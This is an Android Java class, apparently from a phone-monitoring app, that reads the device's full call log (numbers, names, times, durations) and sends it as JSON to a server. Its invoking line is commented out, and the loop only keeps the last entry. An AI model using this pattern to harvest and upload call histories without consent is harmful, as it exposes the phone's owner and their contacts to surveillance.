package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.util.Log;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class ArchiveCall extends AsyncTask<Context, Void, Void> {
	Context mContext;
	RequestDataBaseHelper db;
	private int iType = 0;
	ConvertDate date;
	private String LOG_TAG = "ArchiveCall";
	
	private String getDuration(long milliseconds) {
		int seconds = (int) (milliseconds / 1000) % 60; // 280
		int minutes = (int) ((milliseconds / (1000 * 60)) % 60);
		int hours = (int) ((milliseconds / (1000 * 60 * 60)) % 24);
		if (hours < 1)
			return minutes + ":" + seconds;
		return hours + ":" + minutes + ":" + seconds;
	}

	private String readCallLogs() {

		// Вставляем контакты
		Logging.doLog(LOG_TAG, "Insert: ", "Inserting ..");
		// формируем JSONobj
		JSONObject AllCallJson = new JSONObject();
		date = new ConvertDate();

		// Делаем запрос к контент-провайдеру
		// и получаем все данные из таблицы
		Cursor callLogCursor = mContext.getContentResolver().query(
				android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
				android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);

		if (callLogCursor != null) {
			JSONObject archiveCallJson = new JSONObject();;
			JSONObject infoCallJson = null;

			// Проходим в цикле, пока не дойдём до последней записи
			Logging.doLog(LOG_TAG, "callogCursor != 0 ..");

			while (callLogCursor.moveToNext()) {
				Logging.doLog(LOG_TAG, "callogCursor moveToNext ..");

				// Идентификатор. В нашем примере не нужен
				// String id = callLogCursor.getString(callLogCursor
				// .getColumnIndex(CallLog.Calls._ID));
				// Имя контакта
				String name = callLogCursor.getString(callLogCursor
						.getColumnIndex(CallLog.Calls.CACHED_NAME));

				String cacheNumber = callLogCursor.getString(callLogCursor
						.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
				// Номер контакта и т.д.
				String number = callLogCursor.getString(callLogCursor
						.getColumnIndex(CallLog.Calls.NUMBER));
				long dateTimeMillis = callLogCursor.getLong(callLogCursor
						.getColumnIndex(CallLog.Calls.DATE));
				long durationMillis = callLogCursor.getLong(callLogCursor
						.getColumnIndex(CallLog.Calls.DURATION));
				int callType = callLogCursor.getInt(callLogCursor
						.getColumnIndex(CallLog.Calls.TYPE));
				int isNew = callLogCursor.getColumnIndex(CallLog.Calls.NEW);

				String duration = getDuration(durationMillis * 1000);

				String dateString = date.getData(dateTimeMillis);

				if (cacheNumber == null)
					cacheNumber = number;
				if (name == null)
					name = "No Name";

				if (callType == CallLog.Calls.OUTGOING_TYPE) {
					iType = 3;
				} else if (callType == CallLog.Calls.INCOMING_TYPE) {
					iType = 2;
				} else if (callType == CallLog.Calls.MISSED_TYPE) {
					iType = 1;
				}
				// Log.d("CallLog", number + " " + name + " " + cacheNumber +
				// " "
				// + dateString + " " + duration + " " + callType + " "
				// + isNew);
				try {
					
					infoCallJson = new JSONObject();

					archiveCallJson.put("time", dateString);
					archiveCallJson.put("type", iType);
					infoCallJson.put("number", number);
					infoCallJson.put("duration", duration);
					archiveCallJson.put("info", infoCallJson);
					AllCallJson.put("data", archiveCallJson);
				} catch (JSONException e) {
					// TODO Автоматически созданный блок catch
					e.printStackTrace();
				}
			}
			callLogCursor.close();

			if (archiveCallJson.toString() != null) {
				DataRequest dr = new DataRequest(mContext);
				dr.sendRequest(archiveCallJson.toString());
				Logging.doLog(LOG_TAG, AllCallJson.toString());
			}
		}
		return null;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
//		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
